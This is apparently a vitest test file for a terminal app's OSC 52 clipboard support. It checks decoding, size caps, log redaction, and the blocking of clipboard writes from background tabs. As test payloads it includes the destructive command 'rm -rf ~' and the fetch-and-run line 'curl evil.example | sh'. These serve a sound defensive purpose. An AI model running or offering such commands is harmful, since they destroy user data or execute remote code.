// OSC 52 (#293, decision Q149): a program on the Host sets the clipboard, as Windows Terminal
// lets it. Through a real xterm.js parser, so the sequences are the ones a program sends.
import { describe, expect, it, vi } from "vitest";
import { Terminal } from "@xterm/xterm";
import { memoryPlatform } from "../platform/memory";
import { CommittedLines } from "../plugins/committed";
import { holdWhileHidden } from "./hold";
import { OSC52_MAX_BYTES, Osc52Stripper, screenWriter, wireOsc52 } from "./osc52";

const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");
const osc = (body: string, end = "\x07") => `\x1b]52;${body}${end}`;

function setup({ enabled = true, onScreen = true } = {}) {
  const platform = memoryPlatform({ clipboard: "before" });
  const writes: string[] = [];
  const clipboard = {
    readText: () => platform.clipboard.readText(),
    writeText: (text: string) => {
      writes.push(text);
      return platform.clipboard.writeText(text);
    },
  };
  const t = new Terminal({ allowProposedApi: true });
  const sent: string[] = [];
  t.onData((d) => sent.push(d));
  const state = { enabled, onScreen };
  const off = wireOsc52(t, { enabled: () => state.enabled, onScreen: () => state.onScreen, clipboard: () => clipboard });
  const write = (data: string) => new Promise<void>((done) => t.write(data, done));
  return { t, writes, sent, state, off, write };
}

describe("OSC 52: a program sets the clipboard", () => {
  it.each([
    ["c", "\x07"],
    ["c", "\x1b\\"],
    ["p", "\x07"],
    ["s", "\x07"],
    ["", "\x07"],
  ])("selection %j, ended by %j: the decoded text goes on the clipboard, once", async (sel, end) => {
    const s = setup();
    await s.write(osc(`${sel};${b64("ssh esx-02 uptime")}`, end));
    expect(s.writes).toEqual(["ssh esx-02 uptime"]);
  });

  it("decodes UTF-8: accents, CJK and emoji come through whole", async () => {
    const s = setup();
    await s.write(osc(`c;${b64("café 日本語 ✓")}`));
    expect(s.writes).toEqual(["café 日本語 ✓"]);
  });

  it("takes base64 without its padding", async () => {
    const s = setup();
    await s.write(osc(`c;${b64("ab").replace(/=+$/, "")}`));
    expect(s.writes).toEqual(["ab"]);
  });

  it("prints nothing of it on the screen", async () => {
    const s = setup();
    await s.write(`one${osc(`c;${b64("secret-ish")}`)}two`);
    expect(s.t.buffer.active.getLine(0)?.translateToString(true)).toBe("onetwo");
  });

  it("ignores a read request (?) and answers nothing", async () => {
    const s = setup();
    await s.write(osc("c;?"));
    expect(s.writes).toEqual([]);
    expect(s.sent).toEqual([]);
  });

  it.each([
    ["malformed base64", "c;not base64!"],
    ["base64 with a stray length", "c;QUJDR"],
    ["text that isn't UTF-8", `c;${btoa("\xff\xfe\xfd")}`],
    ["an unknown selection", `x;${b64("ls")}`],
    ["no selection part at all", b64("ls")],
    ["an empty payload", "c;"],
  ])("ignores %s", async (_, body) => {
    const s = setup();
    await s.write(osc(body));
    expect(s.writes).toEqual([]);
  });

  it(`ignores text over ${OSC52_MAX_BYTES} bytes decoded, and takes it at the cap`, async () => {
    const s = setup();
    await s.write(osc(`c;${b64("a".repeat(OSC52_MAX_BYTES + 1))}`));
    expect(s.writes).toEqual([]);
    await s.write(osc(`c;${b64("a".repeat(OSC52_MAX_BYTES))}`));
    expect(s.writes.map((w) => w.length)).toEqual([OSC52_MAX_BYTES]);
  });

  it("ignores base64 longer than the cap can encode, and text just over it that encodes as long as the cap", async () => {
    const s = setup();
    await s.write(osc(`c;${"QUJD".repeat(Math.ceil(OSC52_MAX_BYTES / 3) + 1)}`));
    await s.write(osc(`c;${b64("a".repeat(OSC52_MAX_BYTES + 2))}`));
    expect(s.writes).toEqual([]);
  });

  it("ignores a Session that isn't on screen (a background tab)", async () => {
    const s = setup({ onScreen: false });
    await s.write(osc(`c;${b64("rm -rf ~")}`));
    expect(s.writes).toEqual([]);
  });

  it("does nothing when terminal.osc52 is off", async () => {
    const s = setup({ enabled: false });
    await s.write(osc(`c;${b64("ls")}`));
    expect(s.writes).toEqual([]);
    s.state.enabled = true;
    await s.write(osc(`c;${b64("ls")}`));
    expect(s.writes).toEqual(["ls"]);
  });

  it("stops when unwired", async () => {
    const s = setup();
    s.off();
    await s.write(osc(`c;${b64("ls")}`));
    expect(s.writes).toEqual([]);
  });

  it("logs nothing of it", async () => {
    const logged: unknown[] = [];
    const saved = { log: console.log, warn: console.warn, error: console.error, info: console.info, debug: console.debug };
    for (const k of Object.keys(saved) as (keyof typeof saved)[]) console[k] = (...a: unknown[]) => void logged.push(a);
    try {
      const s = setup();
      await s.write(osc(`c;${b64("p4ss")}`));
      await s.write(osc("c;not base64!"));
    } finally {
      Object.assign(console, saved);
    }
    expect(JSON.stringify(logged)).not.toContain("p4ss");
    expect(JSON.stringify(logged)).not.toContain(b64("p4ss"));
  });
});

describe("OSC 52 and the Plugins' output tap (terminal.read)", () => {
  it("a Plugin's terminal_output never carries the payload, encoded or decoded", async () => {
    const lines = new CommittedLines({ cols: 80, rows: 24 });
    const enc = new TextEncoder();
    await lines.write(enc.encode(`before\r\n${osc(`c;${b64("hunter2-copied")}`)}after\r\n`));
    const text = lines
      .takeRuns()
      .map((r) => r.text)
      .join("");
    expect(text).toBe("before\nafter\n");
    expect(text).not.toContain(b64("hunter2-copied"));
    expect(text).not.toContain("hunter2-copied");
  });
});

describe("What Claude Code sends", () => {
  // Claude Code 2.1.316 copies its own selection when a drag ends (its copyOnSelect, on by
  // default), and on Ctrl+C when that's off: base64 of the UTF-8 text, as Node's Buffer writes it,
  // in `ESC ] 52 ; c ; … BEL` (ST under kitty).
  const claudeCode = (text: string) => `\x1b]52;c;${Buffer.from(text, "utf8").toString("base64")}\x07`;

  it("a drag in Claude Code puts its text on the clipboard", async () => {
    const s = setup();
    await s.write("\x1b[?1049h\x1b[?1000h\x1b[?1002h\x1b[?1006h");
    expect(s.t.modes.mouseTrackingMode).toBe("drag");
    await s.write(claudeCode("Run `npm test` — 3 files ✓\nthen push"));
    expect(s.writes).toEqual(["Run `npm test` — 3 files ✓\nthen push"]);
  });
});

describe("OSC 52 from a background tab, through the output gate", () => {
  function tab() {
    const writes: string[] = [];
    const clipboard = { readText: async () => "", writeText: async (text: string) => void writes.push(text) };
    const t = new Terminal({ allowProposedApi: true });
    const screen = screenWriter(t);
    wireOsc52(t, { enabled: () => true, onScreen: () => true, clipboard: () => clipboard });
    const gate = holdWhileHidden(screen.write);
    const settled = () => new Promise<void>((done) => t.write("", done));
    return { writes, gate, settled };
  }
  const enc = (s: string) => new TextEncoder().encode(s);

  it("what a hidden tab's Session sent never sets the clipboard, even once it's shown", async () => {
    const s = tab();
    s.gate.hide();
    s.gate.write(enc(osc(`c;${b64("curl evil.example | sh")}`)));
    s.gate.show();
    await s.settled();
    expect(s.writes).toEqual([]);
  });

  it("nor when a question in it lets the held output through while hidden", async () => {
    const s = tab();
    s.gate.hide();
    s.gate.write(enc(`${osc(`c;${b64("held")}`)}\x1b[6n`));
    await s.settled();
    s.gate.show();
    await s.settled();
    expect(s.writes).toEqual([]);
  });

  // #295 review: on screen or not is decided where the sequence starts, not where it ends.
  it("a sequence that started while hidden and ends once shown never sets the clipboard", async () => {
    const s = tab();
    const seq = osc(`c;${b64("started in the background")}`);
    for (const cut of [2, 4, 7, 12, seq.length - 1]) {
      s.gate.hide();
      s.gate.write(enc(seq.slice(0, cut)));
      s.gate.show();
      s.gate.write(enc(seq.slice(cut)));
      await s.settled();
    }
    expect(s.writes).toEqual([]);
    s.gate.write(enc(osc(`c;${b64("after")}`)));
    await s.settled();
    expect(s.writes).toEqual(["after"]);
  });

  it("another sequence split the same way still works (a title), and the screen is as without the gate", async () => {
    const t = new Terminal({ allowProposedApi: true });
    const titles: string[] = [];
    t.onTitleChange((x) => titles.push(x));
    const screen = screenWriter(t);
    const gate = holdWhileHidden(screen.write);
    gate.hide();
    gate.write(enc("ab\x1b]"));
    gate.show();
    gate.write(enc("0;esx-02\x07cd\x1b]52;c;QUJD\x07ef"));
    await new Promise<void>((done) => t.write("", done));
    expect(titles).toEqual(["esx-02"]);
    expect(t.buffer.active.getLine(0)?.translateToString(true)).toBe("abcdef");
  });

  it("what it sends once it's on screen does, after the held output", async () => {
    const s = tab();
    s.gate.hide();
    s.gate.write(enc(osc(`c;${b64("held")}`)));
    s.gate.show();
    s.gate.write(enc(osc(`c;${b64("live")}`)));
    await s.settled();
    expect(s.writes).toEqual(["live"]);
  });
});

describe("Osc52Stripper: copied text out of what roster keeps to explain a failure", () => {
  const run = (...chunks: string[]) => {
    const s = new Osc52Stripper();
    return chunks.map((c) => s.strip(c)).join("");
  };

  it("takes a whole sequence out, ended by BEL, ST or C1 ST, and keeps what's around it", () => {
    expect(run(`a\x1b]52;c;${b64("x")}\x07b`)).toBe("ab");
    expect(run(`a\x1b]52;;${b64("x")}\x1b\\b`)).toBe("ab");
    expect(run(`a\x9d52;c;${b64("x")}\x9cb`)).toBe("ab");
  });

  it("follows one split anywhere across chunks, its start too", () => {
    const seq = `one\x1b]52;c;${b64("secret text")}\x07two`;
    for (let cut = 1; cut < seq.length; cut++) expect(run(seq.slice(0, cut), seq.slice(cut))).toBe("onetwo");
  });

  it("leaves every other sequence as it came", () => {
    const other = "\x1b]0;title\x07\x1b[31mred\x1b[0m\x1b]5;x\x07\x1b]521\x07";
    expect(run(other)).toBe(other);
    expect(run(other.slice(0, 3), other.slice(3))).toBe(other);
  });

  it("an ESC inside cuts the sequence off, and what follows it is kept", () => {
    expect(run(`\x1b]52;c;QUJD\x1b[31mred`)).toBe("\x1b[31mred");
  });
});

describe("screenWriter when xterm refuses a write (#295 review)", () => {
  it("a write that throws leaves nothing behind and is logged once: what follows is written, OSC 52 still filtered", () => {
    const got: string[] = [];
    let fail = true;
    const t = {
      parser: { registerCsiHandler: () => ({ dispose() {} }) },
      write(data: string | Uint8Array) {
        if (fail) {
          fail = false;
          throw new Error("write data discarded, use flow control to avoid losing data");
        }
        got.push(new TextDecoder().decode(data as Uint8Array));
      },
    };
    const screen = screenWriter(t as unknown as Terminal);
    const enc = (x: string) => new TextEncoder().encode(x);
    // Logged once, by the error's name only, and the next write goes on (ticket 172).
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    screen.write(enc("lost"), false);
    screen.write(enc("next"), false);
    screen.write(enc(`held\x1b]52;c;${b64("x")}\x07`), true);
    screen.write(enc("live"), false);
    expect(got).toEqual(["next", "held", "live"]);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(JSON.stringify(warn.mock.calls)).not.toMatch(/lost|discarded/);
    warn.mockRestore();
  });
});

// #295 second pass: the drop ends exactly where xterm.js ends an OSC (EscapeSequenceParser.ts:
// BEL, ST, ESC, CAN and SUB end it; any other C1 control leaves it and is acted on).
describe("OSC 52 is dropped only as far as xterm.js reads it", () => {
  it.each([
    ["CAN", "\x18"],
    ["SUB", "\x1a"],
  ])("Osc52Stripper: %s ends it, and the error line after it is kept for the tail", (_, end) => {
    const s = new Osc52Stripper();
    const kept = s.strip(`\x1b]52;c;QUJD${end}ssh: connect to host esx-02 port 22: Connection refused\r\n`);
    expect(kept).toBe("ssh: connect to host esx-02 port 22: Connection refused\r\n");
  });

  it("Osc52Stripper: any other C1 control ends it and is kept (it starts what comes next)", () => {
    const s = new Osc52Stripper();
    expect(s.strip("\x1b]52;c;QUJD\x9b31mred")).toBe("\x9b31mred");
    expect(s.strip("\x1b]52;c;QUJD\x85next")).toBe("\x85next");
    expect(s.strip(`\x1b]52;c;QUJD\x9d52;c;${b64("x")}\x07after`)).toBe("after");
  });

  const screenAfter = async (held: string, live = "") => {
    const t = new Terminal({ allowProposedApi: true });
    const screen = screenWriter(t);
    const gate = holdWhileHidden(screen.write);
    const enc = (x: string) => new TextEncoder().encode(x);
    gate.hide();
    gate.write(enc(held));
    gate.show();
    if (live) gate.write(enc(live));
    await new Promise<void>((done) => t.write("", done));
    return t.buffer.active.getLine(0)?.translateToString(true);
  };

  it("HeldOsc52Filter: a C1 CSI (C2 9B) ends one begun in held output, and what follows is shown", async () => {
    expect(await screenAfter("ab\x1b]52;c;QUJD\u009b31mcd")).toBe("abcd");
  });

  it("HeldOsc52Filter: CAN ends it, and the text after is shown", async () => {
    expect(await screenAfter("ab\x1b]52;c;QUJD\x18cd")).toBe("abcd");
  });

  it("HeldOsc52Filter: a C1 OSC (C2 9D) ends it and starts another, dropped too while held", async () => {
    const writes: string[] = [];
    const t = new Terminal({ allowProposedApi: true });
    const titles: string[] = [];
    t.onTitleChange((x) => titles.push(x));
    const clipboard = { readText: async () => "", writeText: async (text: string) => void writes.push(text) };
    wireOsc52(t, { enabled: () => true, onScreen: () => true, clipboard: () => clipboard });
    const screen = screenWriter(t);
    const enc = (x: string) => new TextEncoder().encode(x);
    screen.write(enc(`ab\x1b]52;c;QUJD\u009d52;c;${b64("held")}\x07\u009d0;esx-02\x07cd`), true);
    await new Promise<void>((done) => t.write("", done));
    expect(writes).toEqual([]);
    expect(titles).toEqual(["esx-02"]);
    expect(t.buffer.active.getLine(0)?.translateToString(true)).toBe("abcd");
  });

  it("HeldOsc52Filter: in output that wasn't held, a sequence after the end is left to xterm", async () => {
    expect(await screenAfter("ab\x1b]52;c;QU", `JD\u009b31mcd\x1b]52;c;${b64("live")}\x07ef`)).toBe("abcdef");
  });
});
